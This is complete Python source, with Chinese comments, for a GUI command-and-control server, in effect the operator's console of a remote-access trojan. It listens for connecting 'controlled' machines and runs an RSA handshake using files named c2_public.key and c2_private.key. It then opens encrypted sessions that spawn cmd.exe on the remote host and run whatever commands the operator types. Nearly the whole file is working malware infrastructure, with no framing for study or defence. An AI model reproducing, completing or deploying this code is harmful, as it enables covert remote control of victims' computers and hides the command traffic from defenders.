import sys
import os
import socket
import threading
import ctypes
from datetime import datetime
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
QLabel, QLineEdit, QPushButton, QListView, QTextEdit, QDialog,
QMenu, QAbstractItemView, QMessageBox)
from PyQt6.QtCore import Qt, QAbstractListModel, QVariant, QModelIndex, pyqtSignal, QObject, pyqtSlot
import struct

from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes, hmac
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# ========= 切换工作目录 =========
if getattr(sys, 'frozen', False):
    exe_dir = os.path.dirname(sys.executable)
    os.chdir(exe_dir)
else:
    os.chdir(os.path.dirname(os.path.abspath(__file__)))

def load_resources():
    missing = []
    pub_path = "c2_public.key"
    priv_blob_path = "c2_private.key"
    dll_path = "blob2pem.dll"
    if not os.path.exists(pub_path):
        missing.append(pub_path)
    if not os.path.exists(priv_blob_path):
        missing.append(priv_blob_path)
    if not os.path.exists(dll_path):
        missing.append(dll_path)
    if missing:
        msg = "缺失文件：\n" + "\n".join(missing)
        QMessageBox.critical(None,"错误", msg)
        sys.exit(1)

    # 读取原始微软BLOB公私钥
    with open(pub_path, "rb") as f:
        csp_blob_public = f.read()
    with open(priv_blob_path, "rb") as f:
        csp_blob_private = f.read()

    # 加载DLL
    dll = ctypes.CDLL(dll_path)
    dll.ConvertCspPrivateBlobToPem.argtypes = [ctypes.POINTER(ctypes.c_ubyte), ctypes.c_ulong]
    dll.ConvertCspPrivateBlobToPem.restype = ctypes.c_char_p
    dll.FreeMemory.argtypes = [ctypes.c_void_p]

    blob_buf = (ctypes.c_ubyte * len(csp_blob_private)).from_buffer(bytearray(csp_blob_private))
    pem_raw = dll.ConvertCspPrivateBlobToPem(blob_buf, ctypes.c_ulong(len(csp_blob_private)))
    if not pem_raw:
        QMessageBox.critical(None,"错误","BLOB转换PEM失败")
        sys.exit(1)
    pem_bytes = ctypes.string_at(pem_raw)
    dll.FreeMemory(pem_raw)

    private_key = serialization.load_pem_private_key(pem_bytes, password=None, backend=default_backend())
    return csp_blob_public, private_key

CSP_BLOB_PUBLIC, PRIVATE_KEY = load_resources()

# RSA解密优先OAEP‑SHA1，降级PKCS1‑v15，适配Win7 BCrypt
def rsa_decrypt_aes_key(cipher_data: bytes) -> bytes:
    try:
        plain = PRIVATE_KEY.decrypt(
            cipher_data,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA1()),
                algorithm=hashes.SHA1(),
                label=None
            )
        )
        return plain
    except Exception:
        plain = PRIVATE_KEY.decrypt(cipher_data, padding.PKCS1v15())
        return plain

# AES‑CFB + HMAC‑SHA256
def aes_encrypt(plain_data: bytes, aes_key: bytes) -> tuple[bytes, bytes]:
    iv = default_backend().osrandom_rand_bytes(16)
    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv), backend=default_backend())
    enc = cipher.encryptor()
    ciphertext = enc.update(plain_data) + enc.finalize()
    h = hmac.HMAC(aes_key, hashes.SHA256(), backend=default_backend())
    h.update(iv + ciphertext)
    hmac_val = h.finalize()
    return iv + ciphertext, hmac_val

def aes_decrypt(iv_cipher: bytes, hmac_recv: bytes, aes_key: bytes) -> bytes:
    h = hmac.HMAC(aes_key, hashes.SHA256(), backend=default_backend())
    h.update(iv_cipher)
    h.verify(hmac_recv)
    iv = iv_cipher[:16]
    ct = iv_cipher[16:]
    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv), backend=default_backend())
    dec = cipher.decryptor()
    return dec.update(ct) + dec.finalize()


class ClientSignals(QObject):
    on_outp = pyqtSignal(object, str)
    on_disconnect = pyqtSignal(object)


class ClientSession:
    def __init__(self, conn: socket.socket, addr):
        self.conn = conn
        self.addr = addr
        self.ip_str = f"{addr[0]}:{addr[1]}"
        self.last_pong = datetime.now()
        self.connected = True
        self._recv_buf = bytearray()
        self.signals = ClientSignals()
        self.handshake_done = False
        self.aes_session_key: bytes | None = None

    def send_raw_packet(self, body: bytes) -> bool:
        if not self.connected:
            return False
        try:
            header = struct.pack(">I", len(body))
            packet = header + body
            self.conn.sendall(packet)
            return True
        except (OSError, BrokenPipeError):
            self.close()
            return False

    def send_encrypted_packet(self, plain_body: bytes) -> bool:
        if not self.handshake_done or self.aes_session_key is None:
            return False
        iv_cipher, hmac_val = aes_encrypt(plain_body, self.aes_session_key)
        enc_body = iv_cipher + hmac_val
        return self.send_raw_packet(enc_body)

    def close(self):
        self.connected = False
        try:
            self.conn.close()
        except Exception:
            pass


class RemoteCmdDialog(QDialog):
    def __init__(self, client_session: ClientSession, parent=None):
        super().__init__(parent)
        self.main_window = parent
        self.setWindowTitle(f"远程 CMD - {client_session.ip_str}")
        self.resize(680, 450)
        self.client = client_session
        self.is_alive = True

        lay = QVBoxLayout(self)
        self.out_box = QTextEdit()
        self.out_box.setReadOnly(True)
        lay.addWidget(self.out_box)

        input_lay = QHBoxLayout()
        self.cmd_input = QLineEdit()
        self.cmd_input.setPlaceholderText("输入命令回车执行")
        self.cmd_input.returnPressed.connect(self.on_enter_command)
        input_lay.addWidget(self.cmd_input)
        lay.addLayout(input_lay)

        self.out_box.append(f"==== 连接 {self.client.ip_str} 远程 CMD ====\n [*] 已发送 SPAW 启动被控端 cmd.exe")
        self.client.send_encrypted_packet(b"SPAW")

    @pyqtSlot(str)
    def append_text(self, text: str):
        self.out_box.append(text)

    def on_enter_command(self):
        cmd = self.cmd_input.text().strip()
        self.cmd_input.clear()
        if not self.is_alive or not self.client.connected or not self.client.handshake_done:
            self.out_box.append("\n [!] 连接断开/握手未完成")
            return
        payload = b"EXEK" + cmd.encode("gbk", errors="replace")
        ok = self.client.send_encrypted_packet(payload)
        self.out_box.append(f"> {cmd}")
        if not ok:
            self.out_box.append("[发送失败]")

    def closeEvent(self, event):
        self.is_alive = False
        if self.client.connected and self.client.handshake_done:
            self.client.send_encrypted_packet(b"KILL")
        if self.main_window and self.client in self.main_window.open_cmd_dialogs:
            del self.main_window.open_cmd_dialogs[self.client]
        super().closeEvent(event)


class ClientListModel(QAbstractListModel):
    def __init__(self):
        super().__init__()
        self.items: list[ClientSession] = []

    def rowCount(self, parent=QModelIndex()):
        return len(self.items)

    def data(self, index: QModelIndex, role=Qt.ItemDataRole.DisplayRole):
        if not index.isValid() or role != Qt.ItemDataRole.DisplayRole:
            return QVariant()
        s = self.items[index.row()]
        mark = "✓" if s.handshake_done else "…"
        return QVariant(f"{mark} {s.ip_str} | last_pong:{s.last_pong.strftime('%H:%M:%S')}")

    def add(self, sess: ClientSession):
        self.beginInsertRows(QModelIndex(), len(self.items), len(self.items))
        self.items.append(sess)
        self.endInsertRows()

    def remove_by_obj(self, sess: ClientSession):
        idx = self.items.index(sess)
        self.beginRemoveRows(QModelIndex(), idx, idx)
        self.items.pop(idx)
        self.endRemoveRows()


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("TCP 反向控制端【RSA‑AES‑CFB‑HMAC加密】")
        self.resize(700, 500)
        self.server_sock: socket.socket | None = None
        self.server_running = False
        self.client_model = ClientListModel()
        self.open_cmd_dialogs: dict[ClientSession, RemoteCmdDialog] = {}

        w = QWidget()
        self.setCentralWidget(w)
        lay = QVBoxLayout(w)

        top_lay = QHBoxLayout()
        top_lay.addWidget(QLabel("监听端口:"))
        self.port_edit = QLineEdit("8888")
        top_lay.addWidget(self.port_edit)
        self.btn_start = QPushButton("启动监听")
        self.btn_start.clicked.connect(self.start_server)
        top_lay.addWidget(self.btn_start)
        self.btn_stop = QPushButton("停止监听")
        self.btn_stop.clicked.connect(self.stop_server)
        self.btn_stop.setEnabled(False)
        top_lay.addWidget(self.btn_stop)
        lay.addLayout(top_lay)

        self.view = QListView()
        self.view.setModel(self.client_model)
        self.view.setSelectionMode(QAbstractItemView.SelectionMode.SingleSelection)
        self.view.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.view.customContextMenuRequested.connect(self.on_context_menu)
        lay.addWidget(self.view)

        self.log_box = QTextEdit()
        self.log_box.setReadOnly(True)
        lay.addWidget(self.log_box)

    def log(self, msg):
        self.log_box.append(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

    def accept_loop(self):
        while self.server_running:
            try:
                conn, addr = self.server_sock.accept()
                sess = ClientSession(conn, addr)
                sess.signals.on_outp.connect(self.handle_session_outp)
                sess.signals.on_disconnect.connect(self.handle_session_disconnect)
                self.client_model.add(sess)
                self.log(f"新被控端接入 {sess.ip_str}，执行握手")
                t = threading.Thread(target=self.client_recv_loop, args=(sess,), daemon=True)
                t.start()
            except OSError:
                break

    @pyqtSlot(object, str)
    def handle_session_outp(self, sess: ClientSession, text: str):
        if sess in self.open_cmd_dialogs:
            dlg = self.open_cmd_dialogs[sess]
            dlg.append_text(text)

    @pyqtSlot(object)
    def handle_session_disconnect(self, sess: ClientSession):
        if sess in self.open_cmd_dialogs:
            dlg = self.open_cmd_dialogs.pop(sess)
            dlg.append_text("\n [!] TCP 连接已经断开")
        self.client_model.remove_by_obj(sess)
        self.log(f"被控端断开 {sess.ip_str}")

    def client_recv_loop(self, sess: ClientSession):
        buf = sess._recv_buf
        sess.send_raw_packet(CSP_BLOB_PUBLIC)

        while sess.connected:
            try:
                chunk = sess.conn.recv(4096)
                if not chunk:
                    break
                buf.extend(chunk)

                while len(buf) >= 4:
                    body_len = struct.unpack(">I", buf[0:4])[0]
                    total_packet_len = 4 + body_len
                    if len(buf) < total_packet_len:
                        break
                    body = bytes(buf[4:total_packet_len])
                    del buf[:total_packet_len]

                    if not sess.handshake_done:
                        if len(body) == 256:
                            try:
                                aes_key = rsa_decrypt_aes_key(body)
                                if len(aes_key) == 16:
                                    sess.aes_session_key = aes_key
                                    sess.handshake_done = True
                                    self.log(f"{sess.ip_str} 握手完成！")
                                    self.client_model.dataChanged.emit(QModelIndex(), QModelIndex())
                            except Exception as e:
                                self.log(f"{sess.ip_str}握手解密失败:{e}")
                                sess.close()
                        continue

                    try:
                        if len(body) < 16+32:
                            raise Exception("数据包太短")
                        iv_cipher = body[:-32]
                        hmac_recv = body[-32:]
                        plain = aes_decrypt(iv_cipher, hmac_recv, sess.aes_session_key)
                    except Exception as e:
                        self.log(f"{sess.ip_str}解密/HMAC校验失败:{e}")
                        sess.close()
                        continue

                    if len(plain)>=4:
                        cmd_code = plain[0:4]
                        if cmd_code == b"PONG":
                            sess.last_pong = datetime.now()
                            self.client_model.dataChanged.emit(QModelIndex(), QModelIndex())
                        elif cmd_code == b"OUTP":
                            output_bytes = plain[4:]
                            out_text = output_bytes.decode("gbk", errors="replace")
                            sess.signals.on_outp.emit(sess, out_text)

            except OSError:
                break
        sess.close()
        sess.signals.on_disconnect.emit(sess)

    def start_server(self):
        port = int(self.port_edit.text())
        self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_sock.bind(("0.0.0.0", port))
        self.server_sock.listen(8)
        self.server_running = True
        threading.Thread(target=self.accept_loop, daemon=True).start()
        self.btn_start.setEnabled(False)
        self.btn_stop.setEnabled(True)
        self.log(f"开始监听端口 {port}")

    def stop_server(self):
        self.server_running = False
        if self.server_sock:
            try:
                self.server_sock.close()
            except Exception:
                pass
        for s in self.client_model.items:
            s.close()
        self.open_cmd_dialogs.clear()
        self.btn_start.setEnabled(True)
        self.btn_stop.setEnabled(False)
        self.log("停止监听")

    def on_context_menu(self, pos):
        idx = self.view.indexAt(pos)
        if not idx.isValid():
            return
        sess: ClientSession = self.client_model.items[idx.row()]
        menu = QMenu()
        act_open_cmd = menu.addAction("打开远程 CMD 会话")
        ret = menu.exec(self.view.viewport().mapToGlobal(pos))
        if ret == act_open_cmd:
            if sess in self.open_cmd_dialogs:
                dlg = self.open_cmd_dialogs[sess]
                if dlg.isVisible():
                    dlg.raise_()
                    dlg.activateWindow()
                    return
                else:
                    del self.open_cmd_dialogs[sess]
            dlg = RemoteCmdDialog(sess, parent=self)
            self.open_cmd_dialogs[sess] = dlg
            dlg.show()

    def closeEvent(self, event):
        self.stop_server()
        event.accept()


if __name__ == "__main__":
    app = QApplication(sys.argv)
    win = MainWindow()
    win.show()
    sys.exit(app.exec())
